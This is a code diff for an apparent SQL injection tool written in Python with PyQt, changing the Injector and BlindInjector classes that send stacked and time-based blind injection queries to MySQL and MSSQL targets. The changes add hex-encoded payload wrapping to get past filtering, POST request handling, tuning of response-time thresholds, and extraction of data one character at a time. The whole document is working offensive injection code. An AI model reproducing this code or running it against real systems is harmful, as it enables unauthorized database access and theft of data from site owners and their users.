@@ -339,8 +339,12 @@ class Injector(QtCore.QThread):
             self.verbose(None , None, result)
         else:
             result = "NULL"
-            self.verbose("Executing stacked query" , self.vars['query_cmd'])
-            self.wq.httpRequest(self.vars['query_cmd'], True, self.vars)
+            if self.vars['hexed']:
+                query = self.wq.buildQuery(self.dbType('exec_hex'), self.vars, {'hex' : core.txtproc.strToHex(self.vars['query_cmd'], True)})
+            else:
+                query = self.vars['query_cmd']
+            self.verbose("Executing stacked query" , query)
+            self.wq.httpRequest(query, True, self.vars)
         self.querySignal.emit(result, False)
 
     #Making synchronized threads for dumper
@@ -386,6 +390,7 @@ class BlindInjector(QtCore.QThread):
     logSignal = QtCore.pyqtSignal(str)
     progressSignal = QtCore.pyqtSignal(int, bool)
     querySignal = QtCore.pyqtSignal(str, bool)
+    trueTimeSignal = QtCore.pyqtSignal(float)
     #----------------------------------------#
     
     def __init__(self, vars, qstrings):
@@ -419,10 +424,10 @@ class BlindInjector(QtCore.QThread):
     #Current db type selected
     def blindType(self, todo):
         if self.vars['db_type'] == "MySQL":
-            if self.vars['blind_inj_type'] == "Time":
+            if self.vars['blind_inj_type'] == "TIME-BASED":
                 qstring = self.qstrings['mysql_blind_time_based'][todo]
         else:
-            if self.vars['blind_inj_type'] == "Time":
+            if self.vars['blind_inj_type'] == "TIME-BASED":
                 qstring = self.qstrings['mssql_blind_time_based'][todo]
         return core.txtproc.correctQstr(qstring)
     
@@ -440,7 +445,11 @@ class BlindInjector(QtCore.QThread):
         testLog = "Base / Delayed (0:0:" + str(self.vars['time']) + ")\n\n"
         response = self.wq.httpRequest("", False, self.vars, True)
         query = self.wq.buildQuery(self.blindType('delay'), self.vars, {'delay' : str(self.vars['time'])})
-        print(query)
+        if self.vars['hexed']:
+            hex = core.txtproc.strToHex(query, True)
+            query = self.wq.buildQuery(core.txtproc.correctQstr(self.qstrings['mssql_error_based']['exec_hex']), self.vars, {'hex' : hex})
+        if self.vars['method'] == "POST":
+            query = query.replace("=", "[eq]")
         for resp in range(3):
             response = self.wq.httpRequest("", False, self.vars, True)
             self.verbose(None, {'rdata' : "Empty",  'rtime' : str(response)})
@@ -471,14 +480,36 @@ class BlindInjector(QtCore.QThread):
             
         start_time = time.time()
         
+        #just resolving
         response = self.wq.httpRequest("", False, self.vars, True)
-        query = self.wq.buildQuery(self.blindType('delay'), self.vars, {'delay' : str(self.vars['time'])})
-        for i in range(2):
-            self.verbose(query)
-            response = self.wq.httpRequest(query, False, self.vars, True)
-            self.verbose(None, {'rdata' : "Empty",  'rtime' : str(response)})
-        self.response = core.txtproc.roundTime(response)
         
+        #Using user-defined 'True' response time
+        if not self.vars['auto_detect']:
+            self.logSignal.emit("\n====================================\n\n"\
+            "[!] Autodetect skipped, using user-defined 'True' response time: " + str(core.txtproc.roundTime(self.vars['true_time'])) +\
+            "sec (rounding from " + str(self.vars['true_time']) + " +- "\
+            + str(self.vars['difference']) + "; Max allowable lag time: " + str(self.vars['max_lag']) +\
+            ")\n\n====================================\n") 
+            self.response = self.vars['true_time']
+        #Auto detecting time
+        else:
+            query = self.wq.buildQuery(self.blindType('delay'), self.vars, {'delay' : str(self.vars['time'])})
+            if self.vars['hexed']:
+                hex = core.txtproc.strToHex(query, True)
+                query = self.wq.buildQuery(core.txtproc.correctQstr(self.qstrings['mssql_error_based']['exec_hex']), self.vars, {'hex' : hex})
+            if self.vars['method'] == "POST":
+                query = query.replace("=", "[eq]")
+            for i in range(2):
+                self.verbose(query)
+                response = self.wq.httpRequest(query, False, self.vars, True)
+                self.verbose(None, {'rdata' : "Empty",  'rtime' : str(response)})
+            self.logSignal.emit("\n====================================\n\n"\
+            "[+] Setting 'True' response time to " + str(core.txtproc.roundTime(response)) +\
+            "sec (rounding from " + str(response) + " +- " + str(self.vars['difference']) + "; Max allowable lag time: " + str(self.vars['max_lag']) +\
+            ")\n\n====================================\n") 
+            self.response = response
+            self.trueTimeSignal.emit(self.response)
+            
         #Rows count check. If more than 1 row - aborting.
         if "count(*)" not in self.vars['query_cmd'].lower():
             if "from" in self.vars['query_cmd'].lower():
@@ -495,16 +526,20 @@ class BlindInjector(QtCore.QThread):
                 symbol_found = self.getSymbol()
                 if not symbol_found:
                     if not self.bad_response:
+                        retry_counter = 0
                         break
                     else:
                         if retry_counter > 2:
-                            self.logSignal.emit("[!] Retried " + str(retry_counter) + "times, but server response time more than delay you defined."\
+                            self.logSignal.emit("[!] Retried " + str(retry_counter) + \
+                            " times, but server response time (" + str(self.bad_time) + ") more than detected at begining fetching (" + str(self.response) + ")"\
                             " Try to increase delay. Stopping.")
                             break
                         retry_counter += 1
-                        self.logSignal.emit("!!! BAD RESPONSE TIME(server: " + str(self.bad_time) + "  defined delay: "\
-                        + str(self.response ) + ")!!!: Retry #"+ str(retry_counter))
-                        time.sleep(5)
+                        self.logSignal.emit("!!! LAG DETECTED (response time: " + str(self.bad_time) + ") !!!: Retry #"+ str(retry_counter))
+                        time.sleep(3)
+                if self.symbol == "NULL":
+                    self.querySignal.emit(self.symbol, True)
+                    break
                 self.querySignal.emit(self.symbol, True)
                 
         seconds = str(time.time() - start_time).split('.')
@@ -556,7 +591,7 @@ class BlindInjector(QtCore.QThread):
         if self.delayed("= 127"):
             self.string_fetched = True
             self.symbol = "NULL"
-            return False
+            return True
         return True
 
     #If delay occurred
@@ -567,22 +602,30 @@ class BlindInjector(QtCore.QThread):
         else:
             query = self.wq.buildQuery(self.blindType('rows_count'), self.vars,\
                                         {'symbol_num' : str(self.symbol_num), 'condition' : " " + condition, 'delay' : str(self.vars['time'])})
+        if self.vars['hexed'] :
+            query = self.wq.buildQuery(core.txtproc.correctQstr(self.qstrings['mssql_error_based']['exec_hex']), self.vars,{'hex' : core.txtproc.strToHex(query, True)})
         if self.vars['method'] == "POST":
             query = query.replace("=", "[eq]")
         self.verbose(query)
         self.request_counter += 1
         response = self.wq.httpRequest(query, False, self.vars, True)
-        if core.txtproc.roundTime(response) == self.response:
-            self.verbose(None, {'rdata' : True,  'rtime' : str(response)})
-            return True
-        elif core.txtproc.roundTime(response) > self.response:
-            self.verbose(None, {'rdata' : "UNKNOWN (response time was longer than defined)",  'rtime' : str(response)})
+        #If response time < allowable difference (-)
+        if (core.txtproc.roundTime(response) < core.txtproc.roundTime(self.response - self.vars['difference'])):
+            self.verbose(None, {'rdata' : False,  'rtime' : str(response)})
+            return False
+        #If response time > max lagging time
+        if (core.txtproc.roundTime(response) > (self.response + self.vars['max_lag'])):
+            self.verbose(None, {'rdata' : "UNKNOWN (response time was longer). Try to increase maximum lag time.",  'rtime' : str(response)})
             self.bad_response = True
             self.bad_time = response
-        else:
-            self.verbose(None, {'rdata' : False,  'rtime' : str(response)})
-        return False
-    
+            return False
+        #If response match with allowable difference (+ -)
+        if (core.txtproc.roundTime(response) == core.txtproc.roundTime(self.response + self.vars['difference']) or\
+        core.txtproc.roundTime(response) == core.txtproc.roundTime(self.response - self.vars['difference'])):
+            self.bad_response = False
+            self.verbose(None, {'rdata' : True,  'rtime' : str(response)})
+            return True
+        
     #Return symbol
     def retSymbol(self, code):
         self.symbol += chr(code)
